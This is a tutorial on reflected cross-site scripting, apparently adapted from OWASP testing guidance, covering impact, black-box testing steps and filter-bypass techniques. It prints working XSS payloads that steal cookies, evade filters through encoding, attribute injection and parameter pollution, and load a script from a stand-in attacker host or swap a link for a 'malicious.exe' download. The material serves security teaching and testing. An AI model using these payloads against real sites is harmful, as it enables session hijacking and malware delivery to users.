# What is Cross Site Scripting?

Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim.

Reflected XSS are the most frequent type of XSS attacks found in the wild. Reflected XSS attacks are also known as non-persistent XSS attacks and, since the attack payload is delivered and executed via a single request and response, they are also referred to as first-order or type 1 XSS.

Suppose a website has a search function which receives the user-supplied search term in a URL parameter:
`https://website.com/search?term=test`

he application echoes the supplied search term in the response to this URL:
`<p>You searched for: test</p>`

Assuming the application doesn't perform any other processing of the data, an attacker can construct an attack like this:
`https://website.com/search?term=<script>alert("XSS Found!")</script>`

This URL results in the following response:
`<p>You searched for: <script>alert("XSS Found!")</script></p>`

If another user of the application requests the attacker's URL, then the script supplied by the attacker will execute in the victim user's browser, in the context of their session with the application.
<br>
<br>
# Impact of reflected XSS attacks:

If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:

- Perform any action within the application that the user can perform.
- View any information that the user is able to view.
- Modify any information that the user is able to modify.
- Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

There are various means by which an attacker might induce a victim user to make a request that they control, to deliver a reflected XSS attack. These include placing links on a website controlled by the attacker, or on another website that allows content to be generated, or by sending a link in an email, tweet or other message. The attack could be targeted directly against a known user, or could be an indiscriminate attack against any users of the application.

The need for an external delivery mechanism for the attack means that the impact of reflected XSS is generally less severe than stored XSS, where a self-contained attack can be delivered within the vulnerable application itself.
<br>
<br>
# How to start Testing:
## Black-Box Testing

A black-box test will include at least three phases:

- ### Detect Input Vectors:
  Detect input vectors. For each web page, the tester must determine all the web application’s user-defined variables and how to input them. This includes hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. Typically in-browser HTML editors or web proxies are used to view these hidden variables. See the example below.
  <br>
- ### Analyze Input Vectors:
  Analyze each input vector to detect potential vulnerabilities. To detect an XSS vulnerability, the tester will typically use specially crafted input data with each input vector. Such input data is typically harmless, but trigger responses from the web browser that manifests the vulnerability. Testing data can be generated by using a web application fuzzer, an automated predefined list of known attack strings, or manually. Some example of such input data are the following: `<script>alert(123)</script>`
  `"><script>alert(document.cookie)</script>`
  <br>
- ### Check Impact
  For each test input attempted in the previous phase, the tester will analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application’s security. This requires examining the resulting web page HTML and searching for the test input. Once found, the tester identifies any special characters that were not properly encoded, replaced, or filtered out. The set of vulnerable unfiltered special characters will depend on the context of that section of HTML.

  Ideally all HTML special characters will be replaced with HTML entities. The key HTML entities to identify are:
  - `>` (greater than)
  - `<` (less than)
  - `&` (ampersand)
  - `'` (apostrophe or single quote)
  - `"` (double quote)

  Within the context of an HTML action or JavaScript code, a different set of special characters will need to be escaped, encoded, replaced, or filtered out. These characters include:
  - `\n` (new line)
  - `\r` (carriage return)
  - `'` (apostrophe or single quote)
  - `"` (double quote)
  - `\` (backslash
  - `\uXXXX` (unicode values)
<br>
<br>
## Example 1

For example, consider a site that has a welcome notice `Welcome %username%` and a download link.
`http://example.com/index.php?user=Jhon`

The tester must suspect that every data entry point can result in an XSS attack. To analyze it, the tester will play with the user variable and try to trigger the vulnerability.

Let’s try to click on the following link and see what happens:
`http://example.com/index.php?user=<script>alert(123)</script>`

If no sanitization is applied this will result in a popup.

This indicates that there is an XSS vulnerability and it appears that the tester can execute code of his choice in anybody’s browser if he clicks on the tester’s link.
<br>
<br>
### Example 2

Let’s try other piece of code (link):
`http://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");AllLinks[0].href = "http://badexample.com/malicious.exe";}</script>`

This will cause the user, clicking on the link supplied by the tester, to download the file `malicious.exe` from a site they control.
<br>
<br>
## Bypass XSS Filters:

Reflected cross-site scripting attacks are prevented as the web application sanitizes input, a web application firewall blocks malicious input, or by mechanisms embedded in modern web browsers. The tester must test for vulnerabilities assuming that web browsers will not prevent the attack. Browsers may be out of date, or have built-in security features disabled. Similarly, web application firewalls are not guaranteed to recognize novel, unknown attacks. An attacker could craft an attack string that is unrecognized by the web application firewall.

Thus, the majority of XSS prevention must depend on the web application’s sanitization of untrusted user input. There are several mechanisms available to developers for sanitization, such as returning an error, removing, encoding, or replacing invalid input. The means by which the application detects and corrects invalid input is another primary weakness in preventing XSS. A deny list may not include all possible attack strings, an allow list may be overly permissive, the sanitization could fail, or a type of input may be incorrectly trusted and remain unsanitized. All of these allow attackers to circumvent XSS filters.

### Example 3: Tag Attribute Value:

Since these filters are based on a deny list, they could not block every type of expressions. In fact, there are cases in which an XSS exploit can be carried out without the use of `<script>` tags and even without the use of characters such as `<` and `>` that are commonly filtered.

For example, the web application could use the user input value to fill an attribute, as shown in the following code:
`<input type="text" name="state" value="INPUT_FROM_USER">`

Then an attacker could submit the following code:
`" onfocus="alert(document.cookie)`
<br>
<br>
### Example 4: Different Syntax or Encoding

In some cases it is possible that signature-based filters can be simply defeated by obfuscating the attack. Typically you can do this through the insertion of unexpected variations in the syntax or in the enconding. These variations are tolerated by browsers as valid HTML when the code is returned, and yet they could also be accepted by the filter.

Following some examples:
- `"><script >alert(document.cookie)</script >`
- `"><ScRiPt>alert(document.cookie)</ScRiPt>`
- `"%3cscript%3ealert(document.cookie)%3c/script%3e`
<br>
<br>
### Example 5: Bypassing Non-Recursive Filtering

Sometimes the sanitization is applied only once and it is not being performed recursively. In this case the attacker can beat the filter by sending a string containing multiple attempts, like this one:
`<scr<script>ipt>alert(document.cookie)</script>`
<br>
<br>
### Example 6: Including External Script

Now suppose that developers of the target site implemented the following code to protect the input from the inclusion of external script:
```
<?
    $re = "/<script[^>]+src/i";

    if (preg_match($re, $_GET['var']))
    {
        echo "Filtered";
        return;
    }
    echo "Welcome ".$_GET['var']." !";
?>
```

Decoupling the above regular expression:
1. Check for a `<script`
2. Check for a “ “ (white space)
3. Any character but the character `>` for one or more occurrences
4. Check for a `src`

This is useful for filtering expressions like `<script src="http://attacker/xss.js"></script>`
which is a common attack. But, in this case, it is possible to bypass the sanitization by using the `>` character in an attribute between script and src, like this:
`http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT

This will exploit the reflected cross site scripting vulnerability shown before, executing the JavaScript code stored on the attacker’s web server as if it was originating from the victim web site, `http://example/`.
<br>
<br>
### Example 7: HTTP Parameter Pollution (HPP)

Another method to bypass filters is the HTTP Parameter Pollution, this technique was first presented by Stefano di Paola and Luca Carettoni in 2009 at the OWASP Poland conference. See the [Testing for HTTP Parameter pollution](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution) for more information. This evasion technique consists of splitting an attack vector between multiple parameters that have the same name. The manipulation of the value of each parameter depends on how each web technology is parsing these parameters, so this type of evasion is not always possible. If the tested environment concatenates the values of all parameters with the same name, then an attacker could use this technique in order to bypass pattern- based security mechanisms. Regular attack:

```
http://example/page.php?param=<script>[...]</script>
```

Attack using HPP:

```
http://example/page.php?param=<script&param=>[...]</&param=script>
```

See the [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) for a more detailed list of filter evasion techniques. Finally, analyzing answers can get complex. A simple way to do this is to use code that pops up a dialog, as in our example. This typically indicates that an attacker could execute arbitrary JavaScript of his choice in the visitors’ browsers.
